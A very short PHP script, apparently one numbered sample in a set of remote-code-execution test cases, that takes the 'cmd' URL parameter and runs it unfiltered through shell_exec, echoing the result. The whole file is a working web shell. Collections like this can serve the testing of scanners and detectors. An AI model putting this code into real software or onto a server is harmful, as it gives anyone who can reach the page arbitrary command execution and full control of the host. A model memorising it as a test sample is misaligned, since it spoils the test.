<?php
// RCE test variation #1032
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>